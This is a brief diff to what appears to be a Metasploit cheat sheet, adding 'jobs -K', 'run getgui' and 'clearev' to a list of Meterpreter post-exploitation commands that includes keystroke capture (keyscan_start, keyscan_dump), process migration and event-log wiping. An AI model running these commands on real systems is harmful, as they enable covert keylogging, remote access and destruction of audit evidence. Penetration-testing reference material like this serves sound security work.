@@ -26,6 +26,8 @@ info {Modules Name}
 
 show exploits
 
+jobs -K
+
 meterpreter > shell
 meterpreter > run checkvm
 meterpreter > run getcountermeasure
@@ -35,4 +37,6 @@ meterpreter > ps
 meterpreter > migrate {PID}
 meterpreter > keyscan_start
 meterpreter > keyscan_dump
+meterpreter > run getgui -h
+meterpreter > clearev
 meterpreter > quit
